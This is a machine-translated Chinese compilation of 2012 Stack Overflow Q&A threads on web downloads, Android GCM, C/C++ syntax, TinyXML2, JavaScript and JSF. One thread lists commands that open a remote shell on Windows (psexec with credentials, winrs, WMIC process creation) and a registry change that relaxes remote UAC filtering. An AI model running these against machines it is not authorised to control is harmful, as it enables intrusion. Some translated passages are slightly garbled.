请参阅：[关于下载属性的 w3 学校页面](https://www.w3schools.com/tags/att_download.asp)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:56:23.070

您需要配置您的网络服务器以添加`Content-Disposition attachment`到 HTTP 标头。[以下](http://drupal.org/node/417866)是有关如何使用 Apache 执行此操作的说明。

正如 Mitch Satchwell 所说，您也可以使用服务器端语言来执行此操作，这些语言在足够低的级别上运行，因此您可以修改 HTTP 标头。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:58:28.783

使用服务器端语言，您可以设置`Content-Disposition`标题以在用户单击链接时强制下载，但是您无法控制浏览器以及文件在用户计算机上的存储位置，这取决于各个用户的设置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:55:10.717

如果用户已将浏览器设置为提示所有下载，我认为这是不可能的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T13:56:44.807

这将在所有最近的浏览器中引发许多危险信号。
文件下载通过另存为功能进行管理，以保证下载文件时的安全性。
如果您可以将 onclick 下载到一个文件夹，那么是什么阻止您在不点击的情况下进行下载？

但是，如果您仍想实现此目的，则必须使用诸如 flash 或 activeX 之类的第 3 方组件，但这些组件将首先要求用户授予您权限（信任）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T13:59:44.103

您需要控制执行此操作的请求。根据您的 Web 服务器技术，有多种方法可以完成。您要做的是将“Content-Disposition”HTTP 标头设置为“附件；文件=某个文件'。这告诉浏览器下载这个文件而不是“打开”它（如果可以的话）。类似 c# 的示例是：

```
response.AddHeader("Content-Disposition", "attachment; filename=downloadThisAudio.mp3")); 
```

但是您可以通过在 IIS 和 Apache 中的配置来完成此操作。一些谷歌搜索我想你可以找到如何为 MP3 设置这个标题，甚至有条件地（比如每个目录，或者当查询参数存在时）。

# ipad - iPad上的JQuery UI Slider在滑动时没有给出读数

> ID：11935675
> 
> 赞同：0
> 
> 时间：2012-08-13T13:50:02.730
> 
> 标签：ipad, touch, jquery-ui-slider

这在计算机上完美运行，值永远不会失败，我总是得到正确的读数。但是，在 iPad 上，如果我按住或滑动滑块，则该值将显示为零，直到我松开它。我正在为 iPad 功能使用 jQuery UI Touch Punch (http://touchpunch.furf.com/)

我真的不知道发生了什么。请注意，屏幕上的比率确实显示了正确的值，它只是取零值的变量。

## 谢谢您的帮助！

这是我的代码：

```
$(function() { //Set up slider
    $( ".slider" ).slider({
           range: "min",
           value: 50,
           min: 0,
           max: 100,
           step: 1,

           //this gets a live reading of the value and prints it on the page
           slide: function( event, ui ) {
               $( "#ResultRate" ).text( ui.value );
           }
    });
    $('#slider').draggable(); //Add touch screen (i.e. iPad, iPhone, Android) support for the slider
}); 
```

//这部分使用滑块的 setInterval 每 1000 毫秒获取一次读数

var TheRate = $('.slider').slider("option", "value");

# android - GCMRegistrar.onDestroy(context) 崩溃，接收器未注册

> ID：11935680
> 
> 赞同：18
> 
> 时间：2012-08-13T13:50:27.600
> 
> 标签：android, google-cloud-messaging

我应该如何调用 GCMRegistrar.onDestroy？目前我的主要活动包括：

```
protected void onDestroy() {
    GCMRegistrar.onDestroy(this);
    super.onDestroy();
} 
```

在进行注册或取消注册然后终止主要活动之后，我得到了这个：

```
08-13 15:43:56.459: E/AndroidRuntime(2389): FATAL EXCEPTION: main
08-13 15:43:56.459: E/AndroidRuntime(2389): java.lang.RuntimeException: Unable to destroy activity {com.test.android/com.test.android.activities.MainActivity}: java.lang.IllegalArgumentException: Receiver not registered: com.google.android.gcm.GCMBroadcastReceiver@40673a10
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ActivityThread.performDestroyActivity(ActivityThread.java:3090)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ActivityThread.handleDestroyActivity(ActivityThread.java:3155)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ActivityThread.access$2100(ActivityThread.java:132)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1071)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.os.Handler.dispatchMessage(Handler.java:99)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.os.Looper.loop(Looper.java:150)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ActivityThread.main(ActivityThread.java:4277)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at java.lang.reflect.Method.invokeNative(Native Method)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at java.lang.reflect.Method.invoke(Method.java:507)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at dalvik.system.NativeStart.main(Native Method)
08-13 15:43:56.459: E/AndroidRuntime(2389): Caused by: java.lang.IllegalArgumentException: Receiver not registered: com.google.android.gcm.GCMBroadcastReceiver@40673a10
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.LoadedApk.forgetReceiverDispatcher(LoadedApk.java:634)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ContextImpl.unregisterReceiver(ContextImpl.java:880)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.content.Contexttester.unregisterReceiver(Contexttester.java:331)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at com.google.android.gcm.GCMRegistrar.onDestroy(GCMRegistrar.java:249)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at com.test.android.activities.MainActivity.onDestroy(MainActivity.java:407)
08-13 15:43:56.459: E/AndroidRuntime(2389):     at android.app.ActivityThread.performDestroyActivity(ActivityThread.java:3072)
08-13 15:43:56.459: E/AndroidRuntime(2389):     ... 11 more 
```

编辑，来自主要节日：

```
<receiver android:name=".receivers.PushReceiver"
  android:permission="com.google.android.c2dm.permission.SEND" >
  <intent-filter>
    <action android:name="com.google.android.c2dm.intent.RECEIVE" />
    <action android:name="com.google.android.c2dm.intent.REGISTRATION" />

    <category android:name="com.test.android" />
  </intent-filter>
</receiver>

<service android:name=".services.PushService" /> 
```

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2012-08-13T15:17:16.170

我想我解决了。在做 GCMRegistar.register(context) 时，我使用了两种不同的上下文。切换到使用 getApplicationContext() 而不是这个工作正常。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-24T08:12:38.807

其他方式。

```
GCMRegistrar.onDestroy(getApplicationContext()); 
```

# c - ANSI C 变量声明语法“+0”？

> ID：11935685
> 
> 赞同：1
> 
> 时间：2012-08-13T13:51:06.053
> 
> 标签：c, syntax, definition

我必须在 PC 上使用外国 C 代码（最初在嵌入式硬件上运行），我不允许修改。

一个 .h 文件中的一些变量声明如下所示：

```
extern int variableA;
extern variableB;
extern variableC+0; 
```

*   变量A的声明很清楚。
*   variableB 的声明通过编译器，类型假定为 int。
*   变量C 的声明失败。

**问题：** 变量C的声明使用什么样的语法？如何让编译器接受它（不允许修改代码）？这甚至是有效的 C 语法吗？

项目使用的编译器是VS2008内部编译器。

**更新：**

我追溯了包含，并且没有#define 更改该语法。仅供参考，该代码来自机载硬件，并且可以正确编译（使用硬件的编译器）。该变量在我可用的代码部分中用作常规变量：

```
variableC+0 = otherVar; 
```

感谢您的回复，这似乎真的是无效的标准 C 代码，仅适用于该特定编译器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:06:16.480

这种语法在 C 标准中没有任何意义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:52:29.723

根据[MSDN](http://msdn.microsoft.com/en-us/library/e7f8y25b%28v=vs.80%29.aspx) ，这不是有效的语法。

```
 identifier:

    nondigit

    identifier nondigit

    identifier digit

nondigit: one of

    _ a b c d e f g h i j k l m n o p q r s t u v w x y z

    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z

digit: one of

    0 1 2 3 4 5 6 7 8 9 
```

一点都不加。我认为，任何类 C 语言的解析器都会将加号解析为求和表达式。

# c++ - 令人困惑的指针

> ID：11935688
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:51:16.820
> 
> 标签：c++, pointers

当我使用螺旋规则时，我在 10 个螺旋步骤内对下面的线感到困惑。有更快的方法吗？

```
// compiles in VC++ 2010
const void * const ** const volatile ***  const **** _foo_; 
```

例如**ptr 是一个指向指针的指针，它们都是指向指针的指针，它们都是 const void 但其中 2 个是 volatile void const**

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-13T13:55:05.820

[cdecl 说](http://cdecl.ridiculousfish.com/?q=const%20void%20*%20const%20**%20const%20volatile%20***%20%20const%20****%20p)：

```
const void * const ** const volatile ***  const **** p 
```

> 将 p 声明为指向指针的指针 指向 const 的指针 指向指向 const 的指针的指针 指向 const 的指针 指向 const 的指针 指向 const void 的指针

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-13T14:12:03.837

这很容易用螺旋规则！

![在此处输入图像描述](../Images/d9377ad6768cb1b89bb5e2185664bce5.png)

:-P

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-13T13:59:59.127

使用指针和引用声明，您只需从右到左阅读：

`ptr`是指向指针的指针，指向指针的指针，指向指针的指针，`const`指向指针的指针，指向指针的`const volatile`指针，指向未知类型对象的`const`指针。`const`

如果您遵循在第一个类型说明符（ie ）*之后*而不是在它*之前*（ie）放置任何`const`或`volatile`限定符的准则，那么您可以从右到左一致地阅读；否则，当你到达左手端时，你有时会打嗝。*`void const *`*`const void *`**

 **螺旋“规则”有时对涉及数组或函数的声明很有用，其中声明的名称不是声明中的最后一件事。在这种情况下，名称后面没有任何内容，它退化为从右到左阅读。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-08-13T14:05:18.697

那是因为没有螺旋规则。基本上，您首先在右侧处理操作数，然后在左侧处理，在两种情况下都向外处理，并尊重括号。并且 cv 限定符通常限定它们左边的内容。由于这个声明在右边没有操作数，它只是从右到左： 指向指针的指针 指向 const 的指针 指向 const 的指针 指向 const 的指针 volatile 指向 const 的指针 指向 (const) void 的指针。最后一个 const 是因为最后一个 const 左边没有任何东西，所以我们必须将声明视为`void const`，而不是`const void`. 除此之外，*如果*您忘记了被误导的螺旋，那么声明应该不会造成任何问题。**

# c++ - 如何在 TinyXML2 中将 XMLElement 转换为字符串

> ID：11935689
> 
> 赞同：5
> 
> 时间：2012-08-13T13:51:23.917
> 
> 标签：c++, xml, tinyxml, tinyxml2

在 TinyXml 1 中，可以使用 << 运算符将子元素转换为字符串，例如

```
TiXmlElement * pxmlChild = pxmlParent->FirstChildElement( "child" );
std::stringstream ss;
ss << (*pxmlChild); 
```

这在 TinyXml2 中似乎是不可能的。如何在 TinyXml2 中将元素转换为 xml 字符串？

**编辑：**特别是我在 xml 之后，例如，如果 xml 是：

```
<parent>
    <child>
        <value>abc</value>
    </child>
<parent> 
```

我想要子元素的xml，例如

```
<child>
    <value>abc</value>
</child> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-03-20T21:21:33.050

似乎 Print 不再存在，但 Accept 也一样有效：

```
XMLPrinter printer;
pxmlChild->Accept( &printer );
ss << printer.CStr(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-10T21:30:33.903

来自 TinyXml2 社区：

（子节点的）打印在实用程序函数中：

```
XMLPrinter printer;
pxmlChild->Print( &printer );
ss << printer.CStr(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-24T02:49:40.500

```
 TiXmlElement *assertion; // you can add some elements when you test
    TiXmlPrinter printer;
    assertion->Accept( &printer );
    std::string stringBuffer = printer.CStr();
    cout<<stringBuffer.c_str()<<endl; 
```

# google-maps - 如何让 Google 地图在 Google Chrome 浏览器中以英语（带有英文字母）显示外国国家？

> ID：11935691
> 
> 赞同：12
> 
> 时间：2012-08-13T13:51:26.070
> 
> 标签：google-maps, google-chrome

在 Chrome 中，每个位置都是以其原生形式编写的，我看不懂西里尔字母或中文。如果我在 IE 中打开 Google 地图，名称会以英文显示，但谁愿意使用 IE 做任何事情？谷歌的论坛没有帮助，给他们的消息也没有得到答复。Chrome是否有插件或其他东西来解决这个问题？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-13T13:56:16.257

据我所知-您需要做的就是单击右上角的下拉按钮-然后单击“英语”-将所有文本转换为英语。为我工作:)

![这是截图](../Images/960ecfd30678fbbf45c685dc57884c61.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-12T06:42:44.937

该**选项**可以在地图区域**的右上角下拉菜单**中找到（不是顶部导航栏）。您正在寻找的是下拉箭头（在“交通”下方），您可以在其中选择显示“天气”等内容, 'Labels' 等 - 'English' 也是选项之一，选择它（在选项旁边添加一个复选标记）。通过这样做，**地图上的名称将全部更改为英文。**

# ios - 如何在 Xcode 的委托方法（用户定义）中显示警报框？

> ID：11935692
> 
> 赞同：0
> 
> 时间：2012-08-13T13:51:28.130
> 
> 标签：ios, objective-c, uialertview, uiapplicationdelegate, uialertviewdelegate

我已经编写了一个名为 register 的函数，它与服务器连接并调用 register done 方法（如果连接建立成功），这是一个委托方法，现在我在这里尝试显示警报框，但 UI 卡住并且出现发光但警报盒子没有？有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T07:30:00.240

您正在尝试从后台线程显示警报，您不应该这样做，您需要从主线程显示警报

# windows - 如何在远程 PC 上执行 Windows 命令？

> ID：11935695
> 
> 赞同：48
> 
> 时间：2012-08-13T13:51:46.693
> 
> 标签：windows, cmd

当我知道它的登录名和密码时，是否可以在远程 PC 上执行 Windows shell 命令？是否可以使用客户端 PC 的 Windows shell 来做到这一点？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2014-06-16T12:21:58.017

如果您在域环境中，您还可以使用：

```
winrs -r:PCNAME cmd 
```

这将打开一个远程命令外壳。

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2012-08-13T13:56:13.743

```
psexec \\RemoteComputer cmd.exe 
```

或使用 ssh 或 TeamViewer 或 RemoteDesktop！

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2018-07-16T11:29:50.987

这可以通过使用可以在[此处](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)`PsExec`下载的来完成

```
psexec \\computer_name -u username -p password ipconfig 
```

如果这不起作用，请尝试这样做：-

1.  在远程服务器上打开 RegEdit。
2.  导航到 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System。

3.  添加一个名为 LocalAccountTokenFilterPolicy 的新 DWORD 值

4.  将其值设置为 1。
5.  重新启动您的远程服务器。
6.  尝试从本地服务器再次运行 PSExec。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2015-05-20T09:21:23.173

您可以使用本机 win 命令：

```
WMIC /node:ComputerName process call create “cmd.exe /c start.exe” 
```

WMIC 是 wbem win 文件夹的一部分：C:\Windows\System32\wbem

# c# - ListView + 当前行 + ImageButton

> ID：11935699
> 
> 赞同：1
> 
> 时间：2012-08-13T13:51:58.333
> 
> 标签：c#, asp.net, listview, imagebutton

我有一个名为“Account”的 MSSQL 表，它存储帐户信息：

AccountID SupplierID AccountNumber AccountDate AccountFileName（pdf 文件的名称） AccountFileData（PDF 文件的内容，varbinary(max)）

我还有一个 ListView（通过 DataSource 绑定到表“Account”），它在 ItemTemplate 中显示帐户信息和一个 ImageButton。当我在 ListView 的一行中单击 ImageButton 时，我想根据 PDF 文件打开。

有人知道我该怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:01:38.980

那应该很简单。在项目模板中配置您的图像按钮并为其提供 CommandName 和 CommandArgument（绑定到 ID）：

```
 ...
 <ItemTemplate>
     ...
     <asp:ImageButton runat="server" id="foobar" CommandName="DownloadPDF" CommandArgument='"<%# Eval( "AccountID" ) #>' />
 </ItemTemplate> 
```

然后，添加`OnItemCommand`到您的 ListView：

```
 <asp:ListView .... OnItemCommand="TheListView_ItemCommand" 
```

并实现它以捕获`DownloadPDF`来自子控件（ImageButton）的通知：

```
 protected void TheListView_ItemCommand( object sender, ListViewCommandEventArgs e )
    {
        switch ( e.CommandName )
        {
            case "DownloadPDF":

                string accountID = e.CommandArgument;

                // now create the PDF and send it back to the client

                break;
        }
    } 
```

# javascript - 将javascript和css内联放在一个缩小的html文件中以提高性能？

> ID：11935701
> 
> 赞同：16
> 
> 时间：2012-08-13T13:52:03.353
> 
> 标签：javascript, html, css, performance, minify

一个典型的网站由一个 index.html 文件和一堆 javascript 和 css 文件组成。为了提高网站的性能，可以：

*   缩小 javascript 和 css 文件，以减小文件大小。
*   将 javascript 文件连接到一个文件中，css 文件类似，以减少对服务器的请求数量。对于像 jquery 这样的常用（和共享）库，将它们保留在外部是有意义的，允许浏览器缓存该库并在不同的 Web 应用程序中重用它。

我想知道将串联的 javascript 和 css 文件内联放在单个 html 文件中是否有意义，这将进一步减少请求的数量。这会提高您网站的性能吗？或者它会反向工作，使浏览器无法缓存任何内容？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T14:03:31.893

将 CSS 和 JS 文件合并到一个文件中将减少请求的数量并使其加载速度更快。但是正如评论的那样，除非您有一个单页站点并且该页面的加载时间非常关键，否则它没有多大意义。所以在我看来，你最好把 CSS 和 Javascript 分开。

这是一本书，您可以在其中了解有关该主题的更多信息：

[高性能网站](https://rads.stackoverflow.com/amzn/click/com/0596529309)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-05-23T06:18:00.407

这个工具可能会帮助你。将您的网页转换为内联所有内容的单个 HTML 文件 - 非常适合您希望减少这些 http 请求的移动设备上的 appcache 清单。

[https://github.com/remy/inliner](https://github.com/remy/inliner)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-13T14:03:34.807

这不是一个好主意，原因如下：

1.  你不会享受缓存的好处

2.  您将在所有页面中加载不需要的资源

3.  由于包含不相关代码分支的大文件，您将在开发网站时遇到困难

4.  如果您在一个团队中工作，您将必须始终与您的队友一起处理相同的文件，这意味着您将遇到很多合并冲突。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-13T14:03:20.163

它会减少请求的数量，但也意味着不会缓存那些用于其他页面的请求。将外部文件定义为告诉浏览器“网站的这一部分是可重用的”的一种方式。你会拿走这种能力，所以 CSS 和 JS 会加载。就像jackwanders 所说，如果你只有一页，那就太好了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-14T04:39:08.320

您可以为所有页​​面使用一个 CSS，并且由于它会被缓存，因此后续页面将从缓存中引用它，而无需发送额外的请求。

但是，将所有 Javascript 文件放在一个文件中是上下文相关的。您很可能正在使用 jQuery 等库和相关插件。这“可能”会在插件之间引发冲突问题。因此，在您一次尝试之前，请尝试一次合并几个文件并检查错误是否弹出。

# asp.net - 通过 ip 限制 web 服务

> ID：11935707
> 
> 赞同：-2
> 
> 时间：2012-08-13T13:52:22.670
> 
> 标签：asp.net, web-services, security

我有一个 Web 服务，它将向另一个 Web 应用程序提供数据。我的问题源于安全问题。如果服务正在运行的机器的 IP 与我想要的 ip 不同，我不希望 Web 服务工作。例如，如果有人将 Web 服务复制到他的电脑，它不应该工作，因为 IP 地址已更改。Moroveri mac 地址也可以作为我的替代方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:00:22.080

除非您拥有源代码或二进制文件，否则无法复制 Web 服务。如果 Web 服务向另一个 Web 应用程序提供数据，只需设置一条防火墙规则，阻止来自与您想要的 IP 不同的任何其他 IP 的连接。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-13T14:00:04.417

如果要通过 IP 地址限制访问，则每次 IP 地址更改时都需要更改安全配置。例如，如果将第二个网络适配器添加到服务器，或者如果服务器移动到不同的网段。

另外，您将如何在不同的机器上调试 Web 服务？或者您将如何拥有一个 QA 环境，它的 IP 地址自然会与生产环境中的不同？

# javascript - 我需要帮助在我的 JavaScript 迷你游戏中查找错误（我没有得到三个错误）

> ID：11935709
> 
> 赞同：0
> 
> 时间：2012-08-13T13:52:28.333
> 
> 标签：javascript, html, google-chrome

这是我第一次从头开始制作迷你游戏。

谷歌浏览器在运行时给了我这些错误：

```
Uncaught TypeError: Cannot call method 'draw' of undefined  Logic.js:28
loop                                                        Logic.js:28
startLoop                                                   Logic.js:35
init                                                        Logic.js:19 
```

当我使用“setInterval”时它工作正常，但我想要最新的东西。我不认为 requestAnimationFrame 与它有任何关系。

但我看不出有什么问题！请帮忙。

```
// Create the canvas
var canvas = document.getElementById("canvas");
var ctx = canvas.getContext("2d");
canvas.addEventListener('click', canvasClick, false);

//Declarations
var isPlaying = false;
var animeFrame = window.requestAnimationFrame ||
                 window.webkitRequestAnimationFrame ||
                 window.mozRequestAnimationFrame ||
                 window.msRequestAnimationFrame ||
                 window.oRequestAnimationFrame;

var Pair1;
var Pair2;

//init
function init(){
    startLoop();
    Pair1 = new Pair();
    Pair2 = new Pair();
    alert('init called');
}

//Draw
function loop(){
    if(isPlaying){
        Pair1.draw();
        Pair2.draw();
        animeFrame(loop);
    }
}
function startLoop(){
    isPlaying = true;
    loop();
}

function stopLoop(){
    isPlaying = false;
}

//Interface
function canvasClick(){
    var X = event.x;
    var Y = event.y;

    X -= canvas.offsetLeft;
    Y -= canvas.offsetTop;

    if(X > Pair1.X && X < Pair1.X + 64){
        if(Y > Pair1.Y && Y < Pair1.Y + 96){
            alert('Clicked Pair1');
        };
    };
}

//Create Images
var pairImg = new Image();
pairImg.src = "images/Gold_Pair.png";
pairImg.addEventListener('load',init,false)

//Pair
function Pair(){
    var X = Math.floor(Math.random() * (canvas.width - 64));
    var Y = Math.floor(Math.random() * (canvas.height - 96));
}

//Draw
Pair.prototype.draw = function(){
    ctx.drawImage(pairImg, this.X, this.Y, 64, 96);
}; 
```

谢谢你的回复！！！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T13:56:56.130

你的“init”函数调用“startLoop”，它调用“loop”，它期望“Pair1”和“Pair2”已经初始化。*然而，“init”在*调用“startLoop”之前不会初始化它们。

尝试更改“init”：

```
function init(){
    Pair1 = new Pair();
    Pair2 = new Pair();
    startLoop();
    alert('init called');
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:57:58.350

I think the problem is that your function `loop` requires `Pair1` and `Pair2` to exist, but `init` doesn’t do that until after `loop` has been called (via `startloop`).

Maybe this version of `init` would work?

```
//init
function init(){
    Pair1 = new Pair();
    Pair2 = new Pair();
    startLoop();
    alert('init called');
} 
```

# google-apps-script - “在 Google 站点中嵌入 Google 文档文件夹”脚本返回错误。现在是否需要额外的权限才能运行它？

> ID：11935710
> 
> 赞同：1
> 
> 时间：2012-08-13T13:52:31.087
> 
> 标签：google-apps-script

我从谷歌电子表格脚本库中添加了“在谷歌站点中嵌入谷歌文档文件夹”，并允许运行、添加文件夹 ID 和谷歌站点页面的 URL。它对于我是所有者或编辑者的文件运行良好，但是当我是查看者时会发生错误并显示以下错误消息

您无权执行该操作。（第 31 行）

上述情况发生在 Google Apps 帐户和消费者帐户中。

我想知道是否需要额外的许可，或者是否有另一种方法可以让文档的所有者与我共享。

在此先感谢，鲁本

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T16:53:46.720

[问题 1258：DocsList 和仅查看访问](http://code.google.com/p/google-apps-script-issues/issues/detail?id=1258#c4)被标记为“WorkingAsIntended”，2012 年 8 月 22 日。

按照 Google 的共享模式，“只读”访问权限不会授予查看文档所有者姓名或 ID 的权限。

# jquery - 在右侧对齐 html 表单（JQuery 移动版）

> ID：11935713
> 
> 赞同：2
> 
> 时间：2012-08-13T13:52:43.230
> 
> 标签：jquery, html, forms, alignment

我只想移动右侧的 HTML 表单（在地图下）。我尝试使用`align="right"`但没有任何变化。这是我的完整代码。您可以运行它来查看它的外观：地图显示也很奇怪，但这是另一个问题。

```
<!DOCTYPE html> 
<html> 
    <head> 
    <title>Finding the best location</title> 
    <meta name="viewport" content="width=device-width, initial-scale=1"> 

    <link rel="stylesheet" href="http://cdn.leafletjs.com/leaflet-0.4.4/leaflet.css" />
<!--[if lte IE 8]>
    <link rel="stylesheet" href="http://cdn.leafletjs.com/leaflet-0.4.4/leaflet.ie.css" />
<![endif]-->

<script src="http://cdn.leafletjs.com/leaflet-0.4.4/leaflet.js"></script>

    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.css" />
    <script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
    <script src="http://code.jquery.com/mobile/1.1.1/jquery.mobile-1.1.1.min.js"></script>

</head> 

<body> 
<div data-role="page">
<div data-role="header">
<div data-role="content" >

        <h1>Location suitability application</h1>
    </div><!-- /header -->
    <div id="mymap" style="height:300px;width:700px""></div>            

<form name="theform" >
        <table width="600"> 
        <tr>
            <td width="400" align="left">

            <td width="9"> 
            <td width="224"> 
            <b>Business importance factor:</b>
            <SELECT name="busfac"> 
            <OPTION selected value="1">1</OPTION>
            <OPTION value="2">2</OPTION>
            <OPTION value="3">3</OPTION>
            <OPTION value="4">4</OPTION>
            <OPTION value="5">5</OPTION>

            </SELECT>
        </tr>

        <tr>
            <td width="154" align="left">
            <td width="9">
            <td width="224">
            <b>Neighborhood importance factor:</b>
            <SELECT name="neifac">
            <OPTION selected value="1">1</OPTION>
            <OPTION value="2">2</OPTION>
            <OPTION value="3">3</OPTION>
            <OPTION value="4">4</OPTION>
            <OPTION value="5">5</OPTION>
            </SELECT>
        </tr>

        <tr>
            <td width="154" align="left">
            <td width="9">
            <td width="224">    
            <input type="button" Value="Store point" 
            onclick="insertW(this.form.busfac.value,this.form.neifac.value);"/>
        </tr>

        <tr>
            <td width="154" align="left">
            <td width="9">
            <td width="224">    
            <input type="button" Value="Calculate best location" 
            onclick="nese(handleLoc);"/>
        </tr>
        <tr>
        <td width="154" align="left">
            <td width="9">
            <td width="224">    
            <p> Your Latitude is: <b id="C1" name="Latitude"> </b> </p>
            <p> Your Longitude is: <b id="C2" name="Longitude"> </b> </p>
        </tr>
        </table>

        <td width="154" align="left">
            <td width="9">
            <td width="224">    
            <input type="hidden" name="gjer" id="gjerId" />
        </tr>

        </form>

        <script>

function mark(p) {
theMarker=new L.Marker(p);
map.addLayer(theMarker);
theMarker.bindPopup("You are here");
}

function handleLoc(pos)  {
var a=pos.coords.latitude;
var b=pos.coords.longitude;
var p = new L.LatLng(+a, +b);
mark(p);
document.getElementById("C1").innerHTML;
document.getElementById("C2").innerHTML;
}

function handleErr(pos) {
document.write("could not determine location");
}

if (navigator.geolocation) {
navigator.geolocation.watchPosition(handleLoc, handleErr);
} else {
document.write("geolocation not supported");
}

var map = new L.Map('mymap');
var osmTile = "http://tile.openstreetmap.org/{z}/{x}/{y}.png";
var osmCopyleft = "Map data &copy;2012 OpenStreetMap contributors";

var osmLayer = new L.TileLayer(osmTile, {
    attribution: osmCopyleft
});
map.addLayer(osmLayer);
map.setView(new L.LatLng(41.33,19.8), 13);

    </script> 
        </div><!-- /content -->
        <div data-role="footer">
        <h4>Page Footer</h4>
        </div>
    </div>  
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:56:01.037

在您的**CSS**文件中，尝试：

```
float: right; 
```

# jsf - 转换器不适用于 @ViewScoped

> ID：11935717
> 
> 赞同：1
> 
> 时间：2012-08-13T13:52:56.757
> 
> 标签：jsf, null, converter, session-scope, view-scope

我遇到了转换器的问题。在我的 xhtml 文件中，我有一个带有对象列表的 selectOneMenu，我想在我的 managedBean 中设置一个对象。

如果我的 managedBean 具有@SessionScoped，则 managedbean 中的对象被填充，但如果 managedeban 具有 @ViewScoped，则转换器永远不会使用并且我的对象为空。

如何解决这个问题？

XHTML：

```
<p:selectOneMenu value="#{rechercheBean.role}" converter="#{typConverter}">
    <f:selectItems id="item" value="#{typBean.roles}" var="r" itemLabel="#{r.valeur}" itemValue="#{r}" />
</p:selectOneMenu> 
```

类型转换器：

```
public class TypConverter implements Converter{
    @EJB
    private TypFacadeLocal  TypBean;

    public Object getAsObject(FacesContext facesContext, UIComponent component, String submittedValue) {
        if (submittedValue.trim().equals("")) {
            return null;
        }
        else {
            try {
                Integer id = Integer.parseInt(submittedValue);
                Typ typ = new Typ();
                typ = TypBean.find(id);
                return typ;
            }
            catch (NumberFormatException exception) {
                throw new ConverterException(new FacesMessage(FacesMessage.SEVERITY_ERROR, "Conversion Error", "Typ non valide"));
            }
        }
    }

    public String getAsString(FacesContext facesContext, UIComponent component, Object value) {
        if (value == null || value.equals("")) {
            return "";
        }
        else {
            return String.valueOf(((Typ) value).getId());
        }
    }
} 
```

发送很多

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-19T15:22:28.317

问题是组件 c:when。有了组件的属性渲染器，就没有问题了。

# c++ - 从不同的类调用函数

> ID：11935723
> 
> 赞同：-9
> 
> 时间：2012-08-13T13:53:37.833
> 
> 标签：c++

这是一个骨架代码：

```
class C{
  callMe(){}
};

class A{
  // How to use callMe()
};

class B : C {
  callMe();
  A a;
}; 
```

在此示例中，B 类扩展了 C 类，因此它可以调用 callMe() 方法。但是我需要在 A 类中使用 callMe() ，因为 A 类不能扩展 C 类。我想知道怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:56:10.487

您需要使 A 包含 C 类型的对象。

```
class A
{
 private:
   C objC;

 public:
   void WhateverMethod() { objC.CallMe(); }

}; 
```

此外，继承的语法是

```
class B : C{

}; 
```

